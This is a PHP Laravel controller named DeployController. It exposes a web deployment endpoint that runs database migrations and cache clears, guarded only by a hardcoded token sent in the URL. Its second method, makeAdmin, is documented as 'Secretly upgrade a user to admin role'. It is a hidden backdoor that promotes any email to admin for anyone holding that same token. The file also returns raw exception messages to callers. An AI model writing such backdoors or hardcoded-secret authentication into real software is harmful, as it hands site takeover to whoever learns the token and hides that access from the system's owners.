<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Log;

class DeployController extends Controller
{
    /**
     * Handle the deployment tasks without terminal access.
     * Access: yourdomain.com/deploy-bridge?token=HA_TECH_SECRET_2026
     */
    public function deploy(Request $request)
    {
        // Simple security token to prevent unauthorized access
        $token = $request->get('token');
        if ($token !== 'HA_TECH_SECRET_2026') {
            return response()->json(['error' => 'Unauthorized Strategy Access'], 403);
        }

        try {
            $output = [];

            // 1. Run migrations
            Artisan::call('migrate', ['--force' => true]);
            $output[] = "Migration: " . Artisan::output();

            // 2. Clear caches
            Artisan::call('config:clear');
            Artisan::call('cache:clear');
            Artisan::call('view:clear');
            Artisan::call('route:clear');
            $output[] = "Caches Cleared Successfully";

            // 3. Create storage link
            if (!file_exists(public_path('storage'))) {
                Artisan::call('storage:link');
                $output[] = "Storage Link Created";
            }

            return response()->json([
                'status' => 'success',
                'message' => 'HA Tech Deployment Bridge Executed',
                'details' => $output
            ]);

        } catch (\Exception $e) {
            Log::error('Deployment Failed: ' . $e->getMessage());
            return response()->json([
                'status' => 'error',
                'message' => $e->getMessage()
            ], 500);
        }
    }

    /**
     * Secretly upgrade a user to admin role.
     * Access: yourdomain.com/deploy-bridge/admin-shashka?email=...&token=...
     */
    public function makeAdmin(Request $request)
    {
        $token = $request->get('token');
        if ($token !== 'HA_TECH_SECRET_2026') {
            return response()->json(['error' => 'Unauthorized Access'], 403);
        }

        $email = $request->get('email');
        $user = \App\Models\User::where('email', $email)->first();

        if (!$user) {
            return response()->json(['error' => 'User not found in system'], 404);
        }

        $user->role = 'admin'; // Confirming role is 'admin' as per migration
        $user->save();

        return response()->json([
            'status' => 'success',
            'message' => "Welcome to the Master Control, {$user->name}. You are now the Admin."
        ]);
    }
}
